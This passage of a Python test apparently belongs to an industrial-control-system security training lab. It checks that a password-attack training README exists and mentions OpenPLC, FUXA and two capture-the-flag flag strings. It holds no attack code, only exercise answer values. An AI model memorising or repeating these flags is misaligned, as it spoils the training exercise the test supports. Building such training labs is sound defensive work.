    readme_path = Path(__file__).parent.parent / 'training' / 'password_attack' / 'README.md'
    assert readme_path.exists(), (
        f"Password attack training README not found at {readme_path}"
    )

    # Verify README contains expected sections
    content = readme_path.read_text()
    assert 'password' in content.lower() or 'Password' in content, (
        "README missing password attack content"
    )
    assert 'OpenPLC' in content, "README missing OpenPLC attack information"
    assert 'FUXA' in content, "README missing FUXA attack information"
    assert 'CybICS(0penPLC)' in content, "README missing OpenPLC flag"
    assert 'CybICS(FU##A)' in content, "README missing FUXA flag"
